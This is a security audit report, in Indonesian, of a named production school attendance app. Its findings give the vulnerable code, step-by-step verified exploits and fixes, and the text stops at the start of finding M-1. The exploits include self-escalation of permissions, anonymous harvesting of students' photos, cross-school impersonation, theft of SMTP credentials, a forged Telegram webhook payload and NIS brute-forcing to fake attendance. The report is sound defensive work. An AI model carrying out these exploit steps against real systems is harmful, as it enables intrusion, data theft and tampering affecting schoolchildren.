# Laporan Audit Keamanan — Aplikasi Absensi (tyasphoto.ozolab.id)

**Tanggal:** 27 Juli 2026
**Cakupan:** Laravel 13 + Inertia React 19, multi-tenant (6 sekolah, ±206 pengguna), status produksi.
**Dimensi yang diaudit:** otorisasi, isolasi tenant, endpoint publik, penanganan berkas, rahasia/kredensial, injeksi, dan dependensi.
**Metode:** pembacaan kode + verifikasi adversarial. Setiap temuan di bawah ini sudah dicoba digugurkan terlebih dahulu; yang tidak bisa digugurkan saja yang dimuat, sebagian besar dengan bukti eksekusi (test Pest sementara, tinker, atau probe HTTP) yang sudah dibersihkan kembali.

---

## 1. Ringkasan Eksekutif

| Severity | Jumlah |
|---|---|
| Critical | 2 |
| High | 8 |
| Medium | 5 |
| Low | 5 |
| **Total** | **20** |

**Postur keamanan secara jujur.** Fondasi aplikasi ini sebenarnya bagus dan jelas dirancang dengan sadar: ada global scope tenant (`BelongsToSchool`), permission per modul yang konsisten (`AppModule` + middleware `permission:`), `Gate::before` untuk super admin, `routes/api.php` yang sudah ditutup di balik sesi web, rate limiting di semua endpoint publik, dan pemisahan queue untuk job berat. Beberapa hal yang biasanya jadi temuan mudah di aplikasi sejenis justru sudah benar di sini — mass assignment terkendali, tidak ada SQL injection, CSRF aktif, soft delete dihormati oleh `findOrFail`.

Masalahnya terletak pada **dua celah struktural yang keduanya sudah dimanfaatkan penuh oleh rantai serangan nyata**:

1. **Otorisasi berhenti di level "punya permission apa", tidak pernah sampai ke "boleh mengubah apa".** Tidak ada satu pun Policy untuk `School`, `User`, atau `Role`. Akibatnya seorang Admin sekolah biasa — role bawaan yang dimiliki setiap tenant — dapat memberi permission apa pun kepada dirinya sendiri lewat `extra_permissions`, lalu memakai permission itu untuk membaca, mengubah, dan merusak data 5 sekolah lain. Ini bukan skenario teoretis; sudah dibuktikan berjalan end-to-end.

2. **Beberapa endpoint publik terlalu berkuasa untuk statusnya.** Endpoint pratinjau foto Google Drive di `/daftar` menerima `school_id` sembarang tanpa autentikasi sama sekali dan mengunduh berkas dari folder Drive sekolah mana pun ke disk publik. Ditambah bug `sprintf('%d', <ULID>)` yang meruntuhkan seluruh direktori foto siswa dari 6 sekolah menjadi satu folder dengan nama berkas yang bisa ditebak dari nama siswa.

Tidak ditemukan RCE, tidak ditemukan SQL injection, dan tidak ditemukan auth bypass tanpa syarat pada jalur login. Isolasi tenant di lapisan Eloquent sendiri solid — yang bocor adalah model-model yang memang sengaja tidak ber-tenant (`School`, `Setting`, `Role`) dan jalur non-Eloquent (path filesystem, panggilan Google Drive). Dengan kata lain: arsitekturnya benar, penegakan di batas-batas modul "Sistem" dan endpoint publik yang belum lengkap.

Perkiraan usaha perbaikan: **2 temuan critical dan 4 temuan high pertama bisa ditutup dalam satu hari kerja** karena sebagian besar hanya menambahkan pemeriksaan `isSuperAdmin()`/`school_id` dan mengganti aturan validasi. Sisanya pekerjaan bertahap.

---

## 2. Temuan

### 🔴 CRITICAL

---

#### C-1. Admin sekolah bisa memberi permission apa pun kepada dirinya sendiri (`extra_permissions` tanpa batas)

**Severity:** Critical
**Berkas:** `app/Http/Controllers/Admin/UserManagementController.php:116`, `:125`, `:138`
**Dimensi:** otorisasi + isolasi tenant

**Kode bermasalah:**

```php
// baris 116 — satu-satunya penjaga
abort_unless($isSuperAdmin || $user->school_id === auth()->user()->school_id, 403);

// baris 118-126 — validasi
$validated = $request->validate([
    ...
    'role' => ['required', 'string', Rule::in($this->assignableRoles()->pluck('name'))],
    'extra_permissions' => ['array'],
    'extra_permissions.*' => [Rule::in(AppModule::permissions())],   // ← SELURUH 23 permission
]);

// baris 138
$user->syncPermissions($validated['extra_permissions'] ?? []);
```

**Skenario serangan (terverifikasi berjalan):**

1. Role bawaan `ADMIN` setiap sekolah sudah memiliki `users.access` (`app/Enums/AppModule.php:107-113`), jadi lolos middleware `permission:users.access` di `routes/web.php:164-166`.
2. Penjaga di baris 116 hanya mengecek "target satu sekolah dengan pelaku" — **akun sendiri lolos penjaga itu**. Tidak ada blokir self-edit (bandingkan dengan `destroy()` di baris 150 yang justru punya blokir).
3. `assignableRoles()` (baris 167-176) hanya mencegah pemberian **role** SUPER_ADMIN. Ia sama sekali tidak menyentuh `extra_permissions`.
4. `PUT /admin/users/{id-sendiri}` dengan body normal + `extra_permissions[]=schools.access&extra_permissions[]=impersonate.access&extra_permissions[]=notification-gateways.access` → HTTP 302 (sukses). Seluruh baris permission memang ada di DB (`RolePermissionSeeder.php:25-27` membuat semuanya), jadi `syncPermissions()` tidak melempar error.
5. Request berikutnya, Spatie `PermissionMiddleware` membaca direct permission tersebut → `GET /admin/schools` yang tadinya 403 sekarang 200.

Hasil yang dibuktikan pada probe: `$admin->can('schools.access')` **false → true** dalam satu request; `GET /admin/schools` mengembalikan seluruh sekolah beserta `scanner_token` masing-masing; `POST /admin/schools/{sekolah-lain}/scanner-token` benar-benar mengubah token tenant lain (perusakan lintas tenant); `POST /admin/users/{user-sekolah-lain}/impersonate` berhasil dan `auth()->id()` menjadi user sekolah lain.

Mitigasi yang diperiksa dan **tidak** menghentikan serangan ini: `Gate::before` hanya *menambah* hak untuk super admin; global scope `school` tidak berlaku karena `School` memang tidak ber-tenant; `config/permission.php:151` menonaktifkan teams sehingga permission bersifat global; tidak ada satu pun Policy untuk `User`.

**Perbaikan:**

```php
// UserManagementController::update()

// (a) larang menyunting hak akun sendiri
abort_if(
    ! $isSuperAdmin && $user->is($request->user()) && $request->hasAny(['role', 'extra_permissions']),
    403,
    'Tidak bisa mengubah role atau hak akses akun sendiri.'
);

// (b) batasi permission yang boleh diberikan
$grantable = $isSuperAdmin
    ? AppModule::permissions()
    : collect(AppModule::cases())
        ->reject(fn (AppModule $m) => $m->group() === 'Sistem')   // buang schools/roles/impersonate/notification-gateways/kartu-bebas
        ->map(fn (AppModule $m) => $m->permission())
        ->intersect($request->user()->getAllPermissions()->pluck('name'))  // tidak bisa memberi yang tidak dimiliki
        ->values()
        ->all();

$validated = $request->validate([
    ...
    'extra_permissions.*' => [Rule::in($grantable)],
]);
```

Tambahkan test Pest yang memastikan Admin sekolah menerima 403/422 ketika mencoba menyuntikkan `schools.access` ke dirinya sendiri.

---

#### C-2. Unduh berkas Google Drive sekolah mana pun tanpa autentikasi lewat `/daftar/preview-photo` & `/daftar/crop-preview`

**Severity:** Critical
**Berkas:** `app/Http/Controllers/StudentRegistrationController.php:222-267`, `:277-325`; `app/Services/GoogleDriveService.php:277-285`
**Rute:** `routes/web.php:52-53` (publik, hanya `throttle:20,1`)
**Dimensi:** endpoint publik + penanganan berkas

**Kode bermasalah:**

```php
$validated = $request->validate([
    'school_id' => ['required', 'exists:schools,id'],   // ← ULID sekolah mana pun
    'filename'  => ['required', 'string', 'max:500'],   // ← tanpa batasan apa pun
]);

$school = School::with('driveConfig')->findOrFail($validated['school_id']);
...
$searchFolderId = $driveConfig->parents_folder_id ?: $driveConfig->root_folder_id ?: 'root';
$files = $service->findFileByName($validated['filename'], $searchFolderId);
...
$tempName = 'temp/preview-'.Str::random(16).'.jpg';
$service->downloadFile($driveFileId, $fullPath);

return response()->json([
    'found'       => true,
    'filename'    => $files[0]['name'],                        // ← nama berkas asli dibocorkan
    'preview_url' => Storage::disk('public')->url($tempName),  // ← URL publik langsung
]);
```

```php
// GoogleDriveService.php:280 — pencocokan PREFIX, bukan nama persis
'q' => "'{$folderId}' in parents and name contains '{$escapedName}' and trashed = false",
```

**Skenario serangan (terverifikasi):**

1. `GET /daftar` (publik) mengembalikan prop `schools` lengkap dengan **ULID setiap sekolah aktif** (`StudentRegistrationController.php:31-33`). Tidak perlu menebak apa pun.
2. Ambil cookie sesi + XSRF token dari halaman itu — CSRF bukan penghalang, hanya biaya satu request tambahan.
3. `POST /daftar/preview-photo` dengan `{school_id: <ULID sekolah lain>, filename: "a"}`, lalu `"b"`, `"c"`, `"20"`, dst. Karena `name contains` di Drive API v3 adalah pencocokan **prefix token**, prefix satu karakter sudah cocok dengan banyak berkas.
4. Setiap panggilan mengunduh `files[0]` dari folder **Orang Tua / Foto Siswa** sekolah tersebut ke `storage/app/public/temp/` dan mengembalikan URL publiknya + nama berkas aslinya (umumnya berformat NISN/nama siswa).
5. Dengan 20 req/menit dan rotasi IP, penyerang anonim memanen foto wajah anak di bawah umur beserta pemetaan nama berkas dari **seluruh 6 sekolah**, tanpa satu pun kredensial.

Global scope `school` tidak menolong: `BelongsToSchool::currentSchoolId()` mengembalikan `null` ketika tidak ada user login, jadi `SchoolDriveConfig` tidak ter-scope pada request anonim. Kredensial Drive juga satu OAuth refresh token global untuk semua sekolah (`GoogleDriveService::buildClient:29-41`) — tidak ada pemisahan tenant di sisi Drive sama sekali.

**Catatan tambahan (cacat menyertai):** `GoogleDriveService.php:277` melakukan `str_replace("'", "\\'", $name)` — meng-escape kutip tapi **tidak** meng-escape backslash. Pada call site lain yang template query-nya berakhir tepat di nilai yang di-interpolasi, ini memungkinkan Drive query injection. Perbaiki sekalian.

**Perbaikan:**

1. Pindahkan kedua endpoint ke balik `auth` + `permission:siswa.access` (endpoint ini memang hanya dipakai operator pendaftaran), **atau** ikat ke sesi pendaftaran bertoken sekali pakai yang sudah memilih sekolah.
2. Ganti pencocokan menjadi nama persis dan tolak filename terlalu pendek:

```php
// GoogleDriveService::findFileByName
$escapedName = str_replace(['\\', "'"], ['\\\\', "\\'"], $name);
'q' => "'{$folderId}' in parents and name = '{$escapedName}' and trashed = false",
```

3. Jangan pernah fallback ke `'root'`; bila `parents_folder_id` dan `root_folder_id` kosong, kembalikan error.
4. Simpan pratinjau di disk privat dan sajikan lewat `URL::temporarySignedRoute`, bukan `storage/app/public`.
5. Jangan kembalikan nama berkas asli pada respons.

---

### 🟠 HIGH

---

#### H-1. `schools.access` memberi baca/tulis/hapus SEMUA sekolah, termasuk kebocoran `scanner_token`

**Severity:** High
**Berkas:** `app/Http/Controllers/Admin/SchoolController.php` — seluruh method (`index:20`, `edit:100`, `update:114`, `destroy:133`, `regenerateScannerToken:124`)

**Fakta:**
- `app/Models/School.php:13-16` hanya memakai `HasFactory`, `HasUlids`, `SoftDeletes` — **tidak ada** `BelongsToSchool`, jadi tidak ada global scope tenant.
- Seluruh 215 baris `SchoolController` tidak memuat satu pun `isSuperAdmin()`, `abort_unless`, atau perbandingan `school_id` — padahal `UserManagementController` (baris 96/116/148) membuktikan pola itu dikenal dan sengaja tidak dipakai di sini.
- `routes/web.php:190-193` hanya menjaga dengan `permission:schools.access`. Tidak ada `SchoolPolicy` (`app/Policies/` hanya berisi `AttendancePolicy` dan `StudentPolicy`).

**Skenario serangan:** pemegang `schools.access` (didapat sendiri lewat C-1) dapat:

| Aksi | Dampak |
|---|---|
| `GET /admin/schools` | Daftar 6 sekolah + `scanner_token` masing-masing (`SchoolController.php:38`) |
| `GET /admin/schools/{lain}/edit` | Mengirim **model School utuh** ke prop Inertia (`:100-102`) — `School` tidak punya `$hidden`, jadi `settings` JSON ikut terserialisasi |
| `PUT /admin/schools/{lain}` | Set `is_active=false` → mematikan operasi sekolah lain |
| `POST /admin/schools/{lain}/scanner-token` | Merotasi token → seluruh perangkat scanner sekolah itu mati |
| `DELETE /admin/schools/{lain}` | Menghapus sekolah yang belum punya siswa |

Dengan `scanner_token` curian, penyerang juga bisa membuka `/scan/{token}` milik sekolah lain tanpa autentikasi (lihat H-6).

**Perbaikan:**

```php
// Tambahkan di constructor SchoolController
public function __construct()
{
    $this->middleware(function ($request, $next) {
        abort_unless($request->user()?->isSuperAdmin(), 403);
        return $next($request);
    });
}
```

Dan pada `edit()`, jangan kirim model mentah:

```php
'school' => $school->only(['id', 'name', 'address', 'phone', 'email', 'logo_path', 'is_active']),
```

---

#### H-2. Seluruh `/api/*` hanya ber-`auth` tanpa `permission` — user tanpa hak apa pun bisa menarik seluruh roster siswa

**Severity:** High
**Berkas:** `routes/api.php:23`, `app/Http/Controllers/Api/StudentApiController.php`

```php
Route::middleware(['web', 'auth', 'throttle:60,1'])->group(function () {   // ← tidak ada permission:
    Route::get('students', [StudentApiController::class, 'index']);
    Route::get('students/{student}', [StudentApiController::class, 'show']);
    Route::get('students/{student}/qr', [StudentApiController::class, 'qr']);
    Route::get('students/by-nis/{nis}', [StudentApiController::class, 'byNis']);
    Route::get('students/by-qr/{token}', [StudentApiController::class, 'byQr']);
});
```

**Skenario serangan (terverifikasi):** role `ORANG_TUA` punya **nol permission** (`AppModule::defaultsFor(UserRole::OrangTua)` mengembalikan `[]`) tetapi akun orang tua tetap punya `school_id`. Hasil probe dengan akun tersebut:

- `GET /admin/siswa` → **403** (benar)
- `GET /api/students?per_page=100` → **200**, seluruh roster sekolah lengkap dengan alamat, tanggal lahir, NIS/NISN, dan `parentProfile.user` yang di-eager-load (nomor WhatsApp orang tua lain)
- `GET /api/students/{id}/qr` → **200**, `qr_svg` berisi `qr_token` siswa
- Token itu bisa diputar balik ke `POST /scan/{scanner_token}` dan mencatat kehadiran atas nama siswa mana pun

`StudentApiController` tidak pernah memanggil `authorize()`; `StudentPolicy` yang ada tidak terpakai di jalur ini.

**Catatan koreksi:** role GURU **tidak** terdampak — `AppModule.php:112-115` memang memberi `siswa.access` ke Guru. Yang terdampak adalah ORANG_TUA dan role custom apa pun yang dibuat tanpa `siswa.access`. Prasyaratnya akun yang bisa login: orang tua hasil pendaftaran publik mendapat email `@internal.app` + password acak (`ParentProfileService.php:32-40`) dan tidak bisa login, jadi yang relevan adalah akun orang tua yang di-provision admin lewat `OrangTuaController::store`.

**Perbaikan:**

```php
Route::middleware(['web', 'auth', 'permission:siswa.access', 'throttle:60,1'])->group(function () {
    ...
});
// dan pisahkan endpoint /qr ke pemeriksaan lebih ketat — qr_svg setara kredensial absensi
```

---

#### H-3. Impersonasi tidak memeriksa batas sekolah; gate super-admin hanya ada di frontend

**Severity:** High
**Berkas:** `app/Http/Controllers/Admin/ImpersonationController.php:19-41`

```php
public function store(Request $request, User $user): RedirectResponse
{
    $impersonator = $request->user();

    abort_if($request->session()->has(self::SESSION_KEY), 403, 'Anda sudah dalam mode menyamar.');
    abort_if($user->is($impersonator), 403, 'Tidak bisa menyamar diri sendiri.');
    abort_if($user->isSuperAdmin(), 403, 'Tidak bisa menyamar sesama Super Admin.');
    abort_unless($user->is_active, 403, 'Akun tersebut tidak aktif.');
    // ← TIDAK ADA: $impersonator->isSuperAdmin()
    // ← TIDAK ADA: $user->school_id === $impersonator->school_id
```

**Skenario serangan (terverifikasi, 10 asersi lolos):**

1. `User` sengaja opt-out global scope (`app/Models/User.php:48`, `schoolScopeApplies(): false`) karena rekursi guard. Tidak ada `resolveRouteBinding` override, tidak ada `scopeBindings`. Akibatnya route-model binding `{user}` di sini **me-resolve user dari sekolah mana pun**.
2. Semua controller lain menambal ini sendiri (`UserManagementController.php:96/116/148`). `ImpersonationController` tidak.
3. Pembatasan super-admin yang sesungguhnya hanya ada di UI: tombolnya dibungkus `{isSuperAdmin && ...}` di `resources/js/pages/admin/users/index.tsx:124`. `POST /admin/users/{user}/impersonate` bisa dipanggil langsung dengan curl.
4. Digabung dengan C-1: Admin Sekolah A memberi dirinya `impersonate.access`, lalu impersonate user Sekolah B. Baris 36 menulis `current_school_id = $user->school_id` dan `Auth::login()` menjadikannya user Sekolah B seutuhnya — global scope `school` kini membuka seluruh siswa, absensi, orang tua, dan laporan Sekolah B dengan hak tulis penuh.

`SetCurrentSchool` **bukan** mitigasi: setelah `Auth::login($korban)`, user yang aktif adalah korban, jadi middleware justru mengunci konteks ke sekolah korban.

**Pembatas praktis:** ULID user korban tidak bisa dienumerasi (`/admin/users` hanya menampilkan sekolah sendiri, `SchoolController` hanya membocorkan `users_count`), jadi varian lintas-sekolah butuh ULID dari luar sistem. Varian sesama-sekolah berjalan seketika. **Varian tanpa bug lain:** jika super admin secara sah memberikan `impersonate.access` ke satu admin sekolah lewat UI Roles, admin itu langsung punya kemampuan impersonasi lintas tenant *by design* — ini yang membuat temuan berdiri sendiri.

**Perbaikan:**

```php
abort_unless(
    $impersonator->isSuperAdmin() || $user->school_id === $impersonator->school_id,
    403,
    'Tidak bisa menyamar pengguna dari sekolah lain.'
);
// Idealnya lebih ketat lagi — impersonasi setara root:
abort_unless($impersonator->isSuperAdmin(), 403);
```

---

#### H-4. `notification-gateways.access` mengizinkan baca/ubah/hapus gateway notifikasi SEMUA sekolah — termasuk pencurian kredensial SMTP

**Severity:** High
**Berkas:** `app/Http/Controllers/Admin/NotificationGatewayController.php:25`, `:94-96`, `:117-155`, `:173`, `:200-221`

```php
public function index(Request $request): Response
{
    $schools = School::query()->orderBy('name')->get(['id', 'name']);   // ← semua sekolah
    $selectedId = $request->query('school', $schools->first()?->id);
    $selected = $selectedId ? School::find($selectedId) : null;         // ← sekolah mana pun
...
private function saveChannel(School $school, SchoolChannelType $type, bool $isActive, array $settings = []): void
{
    $channel = SchoolNotificationChannel::acrossSchools()->firstOrNew([   // ← scope tenant SENGAJA dilepas
        'school_id' => $school->id,
```

**Fakta:** nol pemeriksaan `isSuperAdmin`/`school_id` di seluruh controller ini; `acrossSchools()` dipanggil di baris 119/159/202 dan `withoutGlobalScope('school')` di baris 221.

**Skenario serangan (paling merusak dari semua modul Sistem):**

1. `GET /admin/notification-gateways?school={sekolah-lain}` → baca `sender_email`, `smtp_host`, `smtp_username`, `bot_username` Telegram sekolah lain.
2. `update()` **mempertahankan** `smtp_password` yang tersimpan bila field dikirim kosong (baris 94-96), tetapi **menimpa** `smtp_host`. Jadi: `PUT /admin/notification-gateways/{korban}` dengan `smtp_username` sama persis dan `smtp_host` menunjuk server penyerang.
3. `POST /admin/notification-gateways/{korban}/test` (baris 173) → `DefaultEmailGateway.php:102-117` membangun mailer dari setting tersimpan dan **mengirimkan kredensial SMTP asli sekolah korban ke server penyerang**.
4. Alternatif: ganti `bot_token` Telegram sekolah lain dengan bot penyerang; `syncTelegramConnection` (baris 117-155) akan **mendaftarkan ulang webhook** ke bot penyerang, sehingga pesan orang tua sekolah itu mengalir ke penyerang.
5. `DELETE` mereset seluruh channel sekolah lain → semua notifikasi orang tua berhenti.

*Koreksi kecil:* `index()` hanya membocorkan boolean `has_token`/`has_smtp_password`, bukan nilai rahasianya; dan `connected_count`/`total_parents` memakai `ParentProfile` yang **tetap** ter-scope, jadi angka itu menampilkan sekolah penyerang sendiri. Tidak mengurangi dampak jalur (2)-(4).

**Perbaikan:** tambahkan `abort_unless($request->user()->isSuperAdmin(), 403);` di `index/update/destroy/test`, atau minimal paksa `$school->id === $request->user()->school_id` untuk non-super-admin. Selain itu, jangan pernah memakai kembali `smtp_password` tersimpan ketika `smtp_host` berubah — anggap perubahan host sebagai rotasi kredensial.

---

#### H-5. Telegram webhook gagal-terbuka: `null !== null` meloloskan penjaga — siapa pun bisa membajak kanal notifikasi orang tua

**Severity:** High
**Berkas:** `app/Http/Controllers/TelegramWebhookController.php:29`
**Rute:** `routes/api.php:8` — di **luar** grup `['web','auth']`, hanya `throttle:120,1`

```php
if (! $channel || $request->header('X-Telegram-Bot-Api-Secret-Token') !== $channel->setting('webhook_secret')) {
    return response()->json(['ok' => false], 403);
}
```

**Akar masalah:** `SchoolNotificationChannel::setting()` (baris 39-42) mengembalikan `null` bila key tidak ada, dan `Request::header()` juga mengembalikan `null` bila header tidak dikirim. Jadi `null !== null` bernilai **false** dan penjaga tidak pernah trip.

**Bagaimana state itu tercapai lewat UI normal:** `saveChannel()` (baris 200-214) menulis `is_active` **sebelum** `syncTelegramConnection()`, dan sync itu `return` lebih awal di baris 130 (bot_token kosong) atau 136 (`resolveUsername()` gagal karena token salah / Telegram tidak bisa dihubungi) — **sebelum** penulisan `webhook_secret` di baris 139-148. Hasilnya: baris DB dengan `is_active=true` dan `webhook_secret=NULL`.

**Skenario serangan (terverifikasi, dua probe berbeda):**

1. Ambil ULID sekolah dari halaman publik `GET /daftar` atau `GET /daftar-telegram` (`ParentTelegramController.php:24-31` justru mempublikasikan sekolah yang channel Telegram-nya aktif — persis himpunan yang rentan).
2. `POST /api/telegram/webhook/{ULID}` **tanpa header apa pun**, body:
   ```json
   {"message":{"chat":{"id":"999999"},"from":{"id":1},"contact":{"user_id":1,"phone_number":"6281234567890"}}}
   ```
3. Penjaga lolos → 200. Cek anti-forward di baris 79 (`contact.user_id === from.id`) dipenuhi sendiri oleh penyerang karena keduanya dari body yang sama.
4. Setiap `ParentProfile` sekolah itu yang `whatsapp_number`-nya cocok di-update `telegram_chat_id = "999999"`.

Dampak: pada varian "token valid tapi `resolveUsername` gagal sesaat", seluruh notifikasi kehadiran anak (nama siswa, kelas, jam masuk/pulang) langsung mengalir ke Telegram penyerang, plus orakel balasan `"Nomor Anda belum terdaftar"` vs `"Berhasil terhubung! <nama anak>"` yang membocorkan nama anak dari kamus nomor HP. Pada varian "bot_token kosong", tidak ada pengiriman seketika (`DefaultTelegramGateway::send` berhenti karena token kosong) tetapi **`telegram_chat_id` yang teracuni tersimpan permanen** dan aktif begitu admin memperbaiki token.

**Perbaikan:**

```php
$secret = (string) $channel?->setting('webhook_secret');

if (! $channel || $secret === '' || ! hash_equals(
    $secret,
    (string) $request->header('X-Telegram-Bot-Api-Secret-Token', '')
)) {
    return response()->json(['ok' => false], 403);
}
```

Tambahan di `syncTelegramConnection`: pada kedua jalur early-return, paksa `is_active = false` dan `save()` supaya kanal tidak pernah aktif tanpa `webhook_secret`. Catatan: saat ini tidak ada satu pun pemakaian `hash_equals` di seluruh `app/`.

---

#### H-6. HMAC pada `qr_token` tidak memberi jaminan apa pun — verifikasi menerima NIS/NISN mentah

**Severity:** High
**Berkas:** `app/Services/Attendance/StudentLookup.php:23`, `app/Http/Controllers/PublicScannerController.php:43-83`, `app/Http/Controllers/PrayerScannerController.php:55`

```php
foreach (['qr_token', 'nisn', 'nis'] as $column) {     // ← fallback ke NIS/NISN mentah
    $student = Student::where($column, $token)
        ->where('school_id', $schoolId)
        ->where('is_active', true)
        ->with('classroom')
        ->first();
```

`QrTokenGenerator.php:27-28` membangun token `<NISN>.<HMAC 24 hex>` dan docblock-nya (baris 17-18) mengklaim *"token cannot be forged without the secret"*. **Klaim itu batal** — bagian HMAC boleh dibuang sepenuhnya karena lookup jatuh ke kolom `nisn` lalu `nis`.

**Skenario serangan (tanpa login):**

1. Dapatkan URL `/scan/{scanner_token}` — URL ini memang dipajang di gerbang/poster sekolah dan tidak pernah kedaluwarsa. Siswa, orang tua, atau tamu mana pun bisa memperolehnya; token juga disisipkan ke props halaman publik (`PublicScannerController.php:30`).
2. `POST /scan/{scanner_token}` dengan body `{"token":"20267001"}` — hanya NIS.
3. Absensi **tercatat** atas nama siswa itu (`AttendanceRecorder`, `deviceId = 'PUBLIC-SCAN'`, `recordedBy = null`), dan respons 200 mengembalikan PII lengkap: `full_name`, `nis`, `nisn`, `no_absen`, kelas, gender, agama, `birth_place`, `birth_date`, `address`, `photo_url`.
4. NIS deterministik: `Actions/Fortify/CreateNewUser.php:93-98` → `sprintf('%04d%d%03d', $year, $grade, $count)`. Data live menunjukkan NIS 8 digit dengan rentang sempit (mis. 20257004–20259296 untuk ±300 siswa). Dengan `throttle:120,1`, seluruh rentang satu sekolah tersapu dalam **±19 menit dari satu IP** tanpa rotasi.

**Dampak ganda:** pemalsuan kehadiran massal (siswa bolos ditandai hadir; atau seluruh angkatan di-*check-out* paksa di jendela pulang) **dan** dump PII satu sekolah oleh penyerang tanpa akun. Di luar jendela jadwal aktif, tetap ada orakel keberadaan yang bersih: 404 "tidak ditemukan" vs 422 "Sudah absen masuk hari ini pukul HH:MM" (`AttendanceRecorder.php:142`).

**Tidak ada kebocoran lintas sekolah** — `where('school_id', $schoolId)` di baris 25 memang bekerja.

**Perbaikan:** input NIS manual adalah fitur yang sengaja ada (`public-scan-console.tsx:542` — *"Tembak barcode gun atau ketik NIS lalu Enter"*), jadi jangan sekadar dihapus. Yang tepat:

```php
// StudentLookup — mode ketat untuk jalur publik
public function findByQrToken(string $token, string $schoolId): ?Student
{
    return Student::where('qr_token', trim($token))
        ->where('school_id', $schoolId)
        ->where('is_active', true)
        ->with('classroom')
        ->first();
}
```

- Pakai `findByQrToken()` di `PublicScannerController::scan` dan `PrayerScannerController::scan`; sisakan fallback NIS/NISN hanya untuk `Admin\ScannerController` yang ada di balik `permission:scanner.access`.
- Jika input manual di gerbang tetap dibutuhkan, tambahkan PIN sisi sekolah pada layar kiosk, dan throttle yang jauh lebih ketat untuk input yang tidak berbentuk token.
- **Pangkas payload respons kiosk** menjadi nama, kelas, foto, status, jam. `address`, `birth_date`, `birth_place`, `religion`, dan `nisn` tidak dibutuhkan layar gerbang.

---

#### H-7. Path foto siswa runtuh jadi satu direktori lintas sekolah — `sprintf('%d', <ULID>)` menghasilkan `1`

**Severity:** High
**Berkas:** `app/Jobs/RegisterStudentCardsJob.php:111` dan `:151`; juga `database/seeders/StudentPhotoSeeder.php:51`

```php
$storagePath = sprintf('photos/students/%d/%d-%s.png', $school->id, $student->id, Str::slug($student->full_name));
```

`schools.id` dan `students.id` keduanya **ULID** (`HasUlids`, `$table->ulid('id')->primary()`), tapi diformat dengan `%d`. Terverifikasi:

```
sprintf('photos/students/%d/%d-%s.png', '01JQZ8ABCDEF', '01KXYZ9999', 'budi-santoso')
→ photos/students/1/1-budi-santoso.png
```

**Kedua** placeholder runtuh. Artinya **seluruh 6 sekolah menulis ke satu folder yang sama**, dan nama berkas hanya ditentukan oleh slug nama siswa.

**Dampak:**

1. **Pengungkapan tanpa autentikasi.** Disk `public` di-symlink ke web root, dan aplikasi sendiri membocorkan pola URL lewat `Storage::disk('public')->url()` di `StudentRegistrationController.php:211`. Penyerang anonim yang tahu nama lengkap seorang siswa cukup `GET /storage/photos/students/1/1-siti-aminah.png`. Autoindex mati (`public/.htaccess`: `Options -Indexes`), jadi tidak ada dump massal — tapi setiap nama yang diketahui = satu foto.
2. **Kerusakan data lintas tenant yang PASTI terjadi tanpa penyerang.** Dua siswa bernama sama di sekolah berbeda saling menimpa foto, lalu baris 113 menghapus berkas sumbernya. Data DB saat ini sudah punya duplikat nama (`Andi Firmansyah` ×2, `Anisa Handayani` ×2). Kartu OSIS/perpustakaan satu siswa bisa mencetak wajah siswa sekolah lain.
3. **Penimpaan yang disengaja.** Penyerang mendaftar lewat `/daftar` (publik) dengan `full_name` persis sama dengan siswa target di sekolah lain, dan foto pilihannya.

*Yang berhasil dibantah:* nama berkas **kartu** adalah `cards/1/{slug}-{nis}-{type}.png` (`CardGeneratorService.php:48-55`) dan lembar pas foto `sheets/1/{slug}-{nis}-{template}.png` — komponen `{nis}` tidak terpengaruh bug `%d`, jadi kartu/lembar foto **tidak** bisa ditebak hanya dari nama, dan klaim "siapa pun bisa check-in atas nama siswa lewat kartu curian" tidak terbukti.

**Perbaikan:**

```php
$storagePath = sprintf(
    'photos/students/%s/%s-%s.png',
    $school->id,                 // %s, bukan %d
    $student->id,
    Str::random(16)              // komponen tak-tertebak
);
```

Migrasikan berkas lama ke path baru + perbarui kolom `photo_path`. Idealnya pindahkan foto siswa ke disk privat yang disajikan lewat route ber-otorisasi.

---

#### H-8. Parameter `photo_temp` yang dikendalikan penyerang membuat job menyalin lalu MENGHAPUS berkas mana pun di disk publik

**Severity:** High
**Berkas:** `app/Jobs/RegisterStudentCardsJob.php:109-114`; validasi di `app/Http/Controllers/StudentRegistrationController.php:64`

```php
// controller — endpoint publik POST /daftar, throttle:10,1
'photo_temp' => ['nullable', 'string', 'max:255'],   // ← tanpa batasan prefix

// job
if ($this->photoTemp && Storage::disk('public')->exists($this->photoTemp)) {
    $storagePath = sprintf('photos/students/%d/%d-%s.png', ...);
    (new PhotoCropService)->cropAndStore(Storage::disk('public')->path($this->photoTemp), $storagePath, 9, $this->manualCrop);
    Storage::disk('public')->delete($this->photoTemp);   // ← menghapus path dari input pengguna
    $student->update(['photo_path' => $storagePath]);
```

**Skenario serangan (tanpa autentikasi):** `POST /daftar` dengan `photo_temp` diarahkan ke berkas milik tenant lain. Path yang valid mudah didapat: `GET /daftar` (publik) mengembalikan `logo_path` setiap sekolah aktif, dan logo tersimpan di disk `public` (`PengaturanController.php:120`). Foto siswa juga deterministik karena bug H-7. Job akan membaca berkas itu, menyalin isinya menjadi foto siswa milik penyerang, lalu **menghapus berkas aslinya**.

Target yang terjangkau: foto siswa, kartu hasil generate (`cards/1/...`), lembar pas foto (`sheets/1/...`), logo dan favicon. Traversal keluar disk memang diblokir Flysystem, tetapi seluruh isi `storage/app/public` terjangkau. Batasan: `delete()` hanya berjalan bila `cropAndStore` berhasil, sehingga primitif ini terbatas pada berkas gambar (JPEG/PNG/WEBP/GIF) — persis kelas berkas yang jadi target.

Laju: sampai 10 penghapusan per menit per IP, ireversibel.

**Perbaikan:** jangan pernah mempercayai path dari klien.

```php
// StudentRegistrationController
'photo_temp' => ['nullable', 'string', 'max:255', 'regex:/^temp\/preview-[A-Za-z0-9]{16}\.jpg$/'],
```

Lebih baik lagi: simpan pemetaan temp di cache (`cache()->put("preview:{$key}", $path, 3600)`) dan kirim hanya `$key` ke klien.

---

### 🟡 MEDIUM

---

#### M-1. `roles.access` memungkinkan menaikkan permission role sendiri, dan role bersifat global lintas sekolah

**Severity:** Medium
**Berkas:** `app/Http/Controllers/Admin/RolePermissionController.php:52-62`, `:35-50`

```php
if ($role->name === UserRole::SuperAdmin->value) {
    return to_route('admin.roles')->withErrors([...]);   // ← hanya SUPER_ADMIN yang dikunci
}

$validated = $request->validate([
    'permissions'   => ['array'],
    'permissions.*' => [Rule::in(AppModule::permissions())],   // ← seluruh 23 permission
]);

$role->syncPermissions($validated['permissions'] ?? []);
```

